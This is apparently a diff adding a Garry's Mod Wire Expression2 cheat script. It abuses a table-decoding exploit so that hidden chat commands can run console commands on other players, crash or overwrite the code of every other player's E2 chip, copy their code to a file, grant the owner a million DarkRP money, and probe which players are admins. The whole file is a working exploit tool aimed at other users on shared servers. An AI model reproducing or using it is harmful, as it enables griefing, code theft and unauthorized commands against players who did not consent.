@@ -1,0 +1,316 @@
+@name Test
+@inputs 
+@outputs 
+@persist Owner:entity O:table T:table C:table SC:table D:table
+# T = This
+# C = Context
+# D = Data
+@trigger 
+
+@import hax
+if (first() | duped())
+{
+    @expand set_code "@name Test\n@inputs \n@outputs \n@persist \n@trigger \n\nprint(\"test\")"
+}
+
+@expand define_glon_chars
+
+if (first() | duped()) {
+    runOnChat(1)
+    
+    Owner = owner()
+    dsSetScope(2)
+    
+    @expand create_exploitable_table G
+    T = glonDecodeTable(G)
+    T["name", string] = ""
+    T["context", array] = array()
+    T["s", entity] = entity()
+    
+    C = glonDecodeTable(G)
+    C["data", array] = array()
+    C["Scope", array] = array()
+    C["Scopes", array] = array()
+    C["s", array] = T["context", array]
+    
+    SC = glonDecodeTable(G)
+    SC[0, array] = array()
+    SC[1, array] = array()
+    SC[2, array] = array()
+    SC["n", array] = C["Scopes", array]
+    
+    D = glonDecodeTable(G)
+    D["s", array] = C["data", array]
+    
+    O = glonDecodeTable(G)
+    O["s", entity] = owner()
+    
+    function string getCC ()
+    {
+        local ConCommand = 1
+        @expand create_exploitable_table G
+        OC = glonDecodeTable(G)
+        OC["s", entity] = owner()
+        
+        OS = SC[0, array]
+        O["OS", array] = OS
+        
+        #SC[0, entity] = owner()
+        
+        local CC = ConCommand
+        print(ConCommand)
+        SC[0, array] = OS
+    }
+    
+    # getCC()
+}
+
+if (chatClk())
+{
+    if (lastSpoke() == owner())
+    {
+        LastSaid = lastSaid()
+        if (LastSaid[1] == "!" || LastSaid[1] == "/")
+        {
+            hideChat(1)
+            LastSaid = LastSaid:sub(2):trim()
+            Arguments = LastSaid:explode(" ")
+            Cmd = Arguments[1, string]:lower()
+            ArgumentString = LastSaid:sub(LastSaid:find(" ") + 1)
+            UnescapedArgumentString = ArgumentString:replace("\\\\", "\\")
+            UnescapedArgumentString = ArgumentString:replace("\\n", "\n")
+            UnescapedArgumentString = ArgumentString:replace("\\r", "\r")
+            UnescapedArgumentString = ArgumentString:replace("\\t", "\t")
+            
+            # EA = EntityArgument
+            # AE = AimEntity
+            # TE = TargetEntity
+            
+            EA = entity(Arguments[2, string]:toNumber())
+            
+            AE = lastSpoke():aimEntity()
+            TE = AE
+            if (EA:isValid())
+            {
+                TE = EA
+            }
+            
+            if (Cmd == "cc")
+            {
+                # Run console command
+                Name = Arguments[2, string]:lower()
+                PList = players()
+                Match = array()
+                for (I = 1, PList:count())
+                {
+                    if (PList[I, entity]:name():lower():find(Name))
+                    {
+                        Match:pushEntity(PList[I, entity])
+                    }
+                }
+                if (Match:count() == 0)
+                {
+                    printColor(vec(255, 0, 0), "No matching players found.")
+                }
+                else
+                {
+                    Match = players()
+                    for (I = 1, Match:count())
+                    {
+                        C["player", entity] = Match[I, entity]
+                        WEC = convarnum("wire_expression2_concmd")
+                        WL = convar("wire_expression2_concmd_whitelist")
+                        if (WEC > 0)
+                        {
+                            concmd(Arguments[3, string])
+                            C["player", entity] = Owner
+                            printColor(vec(0, 128, 0), "Ran \"" + Arguments[3, string] + "\" on " + Match[I, entity]:name() + ".")
+                        }
+                        else
+                        {
+                            C["player", entity] = Owner
+                            printColor(vec(255, 0, 0), Match[I, entity]:name() + " has set wire_expression2_concmd to 0.")
+                        }
+                        C["player", entity] = Owner
+                    }
+                }
+            }
+            elseif (Cmd == "clr")
+            {
+                # Clear target code
+                
+                if (TE:type() == "gmod_wire_expression2")
+                {
+                    @expand create_exploitable_table G
+                    OC = glonDecodeTable(G)
+                    OC["s", entity] = TE
+                    OC["_buffer", string] = ""
+                    OC["_original", string] = ""
+                    OC["buffer", string] = ""
+                    OC["original", string] = ""
+                }
+            }
+            elseif (Cmd == "cr")
+            {
+                # Crash target
+                
+                if (TE:type() == "gmod_wire_expression2")
+                {
+                    @expand create_exploitable_table G
+                    OC = glonDecodeTable(G)
+                    OC["context", array] = array()
+                    OC["s", entity] = TE
+                    
+                    OCC = glonDecodeTable(G)
+                    OCC["data", array] = array()
+                    OCC["s", array] = OC["context", array]
+                    OCC["prf", number] = 1/0
+                    
+                    OCD = glonDecodeTable(G)
+                    OCD["datasignal", array] = array()
+                    OCD["s", array] = OCC["data", array]
+                    
+                    OCDS = glonDecodeTable(G)
+                    OCDS["s", array] = OCD["datasignal", array]
+                    OCDS["scope", number] = 2
+                    
+                    dsSendDirect("poke", TE, "")
+                }
+            }
+            elseif (Cmd == "cra")
+            {
+                # Crash all
+                
+                findByClass("gmod_wire_expression2")
+                R = findToArray()
+                for (I = 1, R:count())
+                {
+                    if (R[I, entity] != entity())
+                    {
+                        @expand create_exploitable_table G
+                        OC = glonDecodeTable(G)
+                        OC["context", array] = array()
+                        OC["s", entity] = R[I, entity]
+                    
+                        OCC = glonDecodeTable(G)
+                        OCC["data", array] = array()
+                        OCC["s", array] = OC["context", array]
+                        OCC["prf", number] = 1/0
+                        
+                        OCD = glonDecodeTable(G)
+                        OCD["datasignal", array] = array()
+                        OCD["s", array] = OCC["data", array]
+                        
+                        OCDS = glonDecodeTable(G)
+                        OCDS["s", array] = OCD["datasignal", array]
+                        OCDS["scope", number] = 2
+                    
+                        dsSendDirect("poke", R[I, entity], "")
+                    }
+                }
+            }
+            elseif (Cmd == "dl")
+            {
+                # Download target
+                
+                if (TE:type() == "gmod_wire_expression2")
+                {
+                    @expand create_exploitable_table G
+                    OC = glonDecodeTable(G)
+                    OC["original", string] = ""
+                    OC["s", entity] = TE
+                    fileWrite(TE:getName() + ".txt", OC["original", string])
+                }
+            }
+            elseif (Cmd == "fa")
+            {
+                # Find all
+                
+                findByClass("gmod_wire_expression2")
+                R = findToArray()
+                for (I = 1, R:count())
+                {
+                Line = "[" + R[I, entity]:id() + "] " + R[I, entity]:getName() + " (" + R[I, entity]:owner():name() + ")"
+                    print(Line)
+                }
+            }
+            elseif (Cmd == "m")
+            {
+                # Set money
+                
+                @expand create_exploitable_table G
+                OC = glonDecodeTable(G)
+                OC["DarkRPVars", array] = array()
+                OC["s", entity] = owner()
+    
+                DRV = glonDecodeTable(G)
+                DRV["s", array] = OC["DarkRPVars", array]
+                DRV["money", number] = 1000000
+            }
+            elseif (Cmd == "pr")
+            {
+                #Probe all
+                
+                R = players()
+                for (I = 1, R:count())
+                {
+                    A = R[I, entity]:isAdmin()
+                    SA = R[I, entity]:isSuperAdmin()
+                    C["player", entity] = R[I, entity]
+                    WEC = convarnum("wire_expression2_concmd")
+                    WL = convar("wire_expression2_concmd_whitelist")
+                    C["player", entity] = Owner
+                    
+                    Line = R[I, entity]:name() + ": "
+                    if (SA) { Line += "[S] " }
+                    elseif (A) { Line += "[A] " }
+                    else { Line += "[U] " }
+                    if (WEC) { Line += "enabled" }
+                    else { Line += "disabled" }
+                    Line += " (Whitelist: " + WL + ")"
+                    print(Line)
+                }
+            }
+            elseif (Cmd == "sc")
+            {
+                # Set target code
+                
+                if (TE:type() == "gmod_wire_expression2")
+                {
+                    @expand create_exploitable_table G
+                    OC = glonDecodeTable(G)
+                    OC["s", entity] = TE
+                    OC["_buffer", string] = ArgumentString
+                    OC["_original", string] = ArgumentString
+                    OC["buffer", string] = ArgumentString
+                    OC["original", string] = ArgumentString
+                }
+            }
+            elseif (Cmd == "sca")
+            {
+                # Set all code
+                
+                findByClass("gmod_wire_expression2")
+                R = findToArray()
+                for (I = 1, R:count())
+                {
+                    if (R[I, entity] != entity())
+                    {
+                        @expand create_exploitable_table G
+                        OC = glonDecodeTable(G)
+                        OC["s", entity] = R[I, entity]
+                        OC["_buffer", string] = ArgumentString
+                        OC["_original", string] = ArgumentString
+                        OC["buffer", string] = ArgumentString
+                        OC["original", string] = ArgumentString
+                    }
+                }
+            }
+			elseif (Cmd == "test")
+			{
+				# Test arguments
+				print(Arguments)
+			}
+        }
+    }
+}
